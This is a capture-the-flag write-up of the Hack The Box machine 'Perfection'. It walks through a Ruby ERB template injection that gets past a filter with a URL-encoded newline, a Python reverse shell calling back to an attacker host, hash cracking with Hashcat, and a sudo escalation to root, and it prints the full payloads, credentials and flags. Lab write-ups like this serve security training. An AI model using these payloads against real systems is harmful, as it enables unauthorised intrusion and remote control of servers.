---
date: 2024-05-04
title: Hack The Box — Perfection
categories:
  - Writeups
  - HTB
  - CTF
tags:
  - ssti
  - ruby
  - erb
  - linux
media_subpath: /assets/images
image: perfection.png
---
# TL;DR

The HackTheBox machine "Perfection" is an easy Linux box featuring a Ruby-based web application vulnerable to Server-Side Template Injection (SSTI). Initial access is gained by exploiting SSTI in a weighted grade calculator form, bypassing input filters with a URL-encoded newline character to execute arbitrary commands, resulting in a reverse shell as the `susan` user. The user flag is retrieved from the home directory. Lateral movement involves cracking a SHA-256 password hash from a SQLite database, guided by a password format hint found in a mail file. Privilege escalation is achieved by leveraging `susan`'s unrestricted `sudo` privileges to access the root flag.

## Initial Enumeration

### Nmap Scan

To begin reconnaissance, a comprehensive Nmap scan was performed to identify open ports, services, and version information on the target machine (IP: 10.10.11.253). This is a standard first step in CTF challenges to map out potential entry points.

The command used was:

```bash
sudo nmap -sS -sV -A -oA nmap/perfection_initial 10.10.11.253
```

- `-sS`: Performs a TCP SYN scan for stealth.
- `-sV`: Probes for service versions.
- `-A`: Enables OS detection, version detection, script scanning, and traceroute.
- `-oA`: Outputs results in all formats for later reference.

**Results:**

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-02 14:43 EDT
Nmap scan report for 10.10.11.253
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.89 seconds
```

**Notes:**

- **SSH (Port 22)**: Running OpenSSH 8.9p1 on Ubuntu, suggesting the OS is likely Ubuntu 22.04 (Jammy Jellyfish). No immediate vulnerabilities were apparent without credentials.
- **HTTP (Port 80)**: Hosted by nginx, indicating a web application. No domain redirect was observed, but `perfection.htb` was added to `/etc/hosts` for consistency:
    
    ```bash
    echo "10.10.11.253 perfection.htb" | sudo tee -a /etc/hosts
    ```
    
- No other ports were open, limiting the initial attack surface to the web service and potential SSH later.

Additional scans (e.g., full port `-p-` or UDP) confirmed only these two ports.

---

## Web Enumeration

### Main Page (perfection.htb)

Navigating to `http://perfection.htb/` revealed a Ruby-based web application powered by WEBrick 1.7.0 and Ruby 3.0.2, as identified by WhatWeb:
![images (36)](images (36).png)

```bash
whatweb http://10.10.11.253
http://10.10.11.253 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx, WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)], IP[10.10.11.253], PoweredBy[WEBrick], Ruby[3.0.2], Script, Title[Weighted Grade Calculator], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block]
```

The main page featured a "Weighted Grade Calculator" form, allowing users to input up to five categories with grades and weights.

![images (37)](images (37).png)

Directory brute-forcing with Gobuster was performed to uncover additional paths:

```bash
gobuster dir -u http://perfection.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster.txt
```

**Results:**

- `/weighted-grade-calc` (Status: 200, form submission endpoint)
- `/static` (Status: 301, likely for CSS/JS assets)
- No other significant endpoints were found.

The `/weighted-grade-calc` endpoint handled POST requests from the form, suggesting potential vulnerabilities in input processing.

### Server-Side Template Injection (SSTI) Testing

The form was tested for Server-Side Template Injection (SSTI) due to the Ruby/WEBrick backend, which likely uses ERB templates. Initial tests with payloads like `<%= 7 * 7 %>` in the `category1` field failed, returning "Malicious Input Detected," indicating input sanitization.

![images (38)](images (38).png)
![images (39)](images (39).png)

Using Burp Suite, a POST request was intercepted:

```http
POST /weighted-grade-calc HTTP/1.1
Host: 10.10.11.253
Content-Type: application/x-www-form-urlencoded
Content-Length: 177

category1=TEST&grade1=100&weight1=100&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0
```

![images (40)](images (40).png)

Testing various SSTI payloads (e.g., `<%= system("whoami") %>`) triggered the filter. However, appending a URL-encoded newline (`%0a`) bypassed the sanitization:

```bash
category1=TEST%0a<%25%3d%60id%60%25>&grade1=100&weight1=100&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0
```

This executed `id`, displaying `uid=1000(susan) gid=1000(susan)` in the response, confirming SSTI.

![images (48)](images (48).png)

---

## Web Exploitation

### Reverse Shell via SSTI

To escalate to remote code execution (RCE), a reverse shell payload was crafted using a Python-based shell from [revshells.com](https://www.revshells.com/):

```bash
export RHOST="10.10.16.48";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

URL-encoded payload:

```bash
category1=TEST%0a<%25%3d%60export%20RHOST%3D%2210.10.16.48%22%3Bexport%20RPORT%3D9001%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22sh%22%29%27%60%25>&grade1=100&weight1=100&category2=N%2FA&grade2=0&weight2=0&category3=N%2FA&grade3=0&weight3=0&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0
```

A Netcat listener was set up:

```bash
nc -lvnp 9001
```

Submitting the payload via Burp Suite or the form resulted in a reverse shell as `susan`.

![images (56)](images (56).png)

The shell was stabilized:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Local Enumeration & User Flag

As `susan`, the filesystem was explored:

```bash
ls -la /home/susan
total 52
drwxr-x--- 8 susan susan 4096 May  2 06:22 .
drwxr-xr-x 3 root  root  4096 Oct 27  2023 ..
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .bash_history -> /dev/null
-rw-r--r-- 1 susan susan  220 Feb 27  2023 .bash_logout
-rw-r--r-- 1 susan susan 3771 Feb 27  2023 .bashrc
drwx------ 2 susan susan 4096 Oct 27  2023 .cache
drwx------ 3 susan susan 4096 May  2 08:43 .gnupg
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .lesshst -> /dev/null
drwxrwxr-x 3 susan susan 4096 Oct 27  2023 .local
drwxr-xr-x 2 root  root  4096 Oct 27  2023 Migration
-rw-r--r-- 1 susan susan  807 Feb 27  2023 .profile
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .python_history -> /dev/null
drwxr-xr-x 4 root  susan 4096 Oct 27  2023 ruby_app
lrwxrwxrwx 1 root  root     9 May 14  2023 .sqlite_history -> /dev/null
drwxrwxr-x 2 susan susan 4096 May  2 06:24 .ssh
-rw-r--r-- 1 susan susan    0 Oct 27  2023 .sudo_as_admin_successful
-rw-r----- 1 root  susan   33 May  2 06:21 user.txt
-rw-r--r-- 1 susan susan   39 Oct 17  2023 .vimrc
```

Retrieved the user flag:

```bash
cat /home/susan/user.txt
0bb4beec5564c84cfa907870261db8cc
```

Found a SQLite database in the `Migration` directory:

```bash
ls -la /home/susan/Migration
total 16
drwxr-xr-x 2 root  root  4096 Oct 27  2023 .
drwxr-x--- 8 susan susan 4096 May  2 06:22 ..
-rw-r--r-- 1 root  root  8192 May 14  2023 pupilpath_credentials.db
```

Transferred the database to the attacker machine using `scp`:

```bash
scp susan@10.10.11.253:/home/susan/Migration/pupilpath_credentials.db .
```

Queried the database with SQLite3:

```bash
sqlite3 pupilpath_credentials.db
.tables
users
select * from users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

The hashes appeared to be SHA-256. A mail file provided a password format hint:

```bash
cat /var/mail/susan
```

**Content:**

> Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is: `{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}`. Note that all letters of the first name should be converted into lowercase. Please hit me with updates on the migration when you can. I am currently registering our university with the platform. - Tina, your delightful student

---

## Lateral Movement

### Password Cracking

Using the password format `susan_nasus_<number>`, the SHA-256 hash for Susan Miller was cracked with Hashcat:

```bash
hashcat -m 1400 -a 3 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f "susan_nasus_?d?d?d?d?d?d?d?d?d" --increment --increment-min=1
```

**Result:**

```
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
```

The password `susan_nasus_413759210` was confirmed for `susan`.

---

## Privilege Escalation

### Sudo Privileges

Checked `sudo` privileges:

```bash
sudo -l
```

**Result:**

```
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
```

The user `susan` could run any command as root with `sudo`. Retrieved the root flag:

```bash
sudo cat /root/root.txt
834ba25a3bea641a37fcd95bd518d293
```

---

## Summary

| Step                 | Description                                                                                                                             |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| Enumeration          | Nmap revealed SSH (22) and HTTP (80) with nginx/WEBrick 1.7.0 (Ruby 3.0.2). Added `perfection.htb` to `/etc/hosts`.                     |
| Web Recon            | Found "Weighted Grade Calculator" form at `/weighted-grade-calc`. WhatWeb confirmed Ruby backend. Gobuster identified static paths.     |
| Exploitation         | Exploited SSTI in form’s `category1` field by bypassing filter with URL-encoded newline (`%0a`). Executed `id` to confirm RCE.          |
| Initial Shell        | Injected Python reverse shell via SSTI, gaining `susan` shell. Stabilized with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.       |
| Lateral Movement     | Found SQLite database with SHA-256 hashes. Cracked `susan`’s password (`susan_nasus_413759210`) using Hashcat and mail-provided format. |
| Privilege Escalation | Used `susan`’s unrestricted `sudo` privileges (`sudo -l: ALL`) to read `/root/root.txt`.                                                |
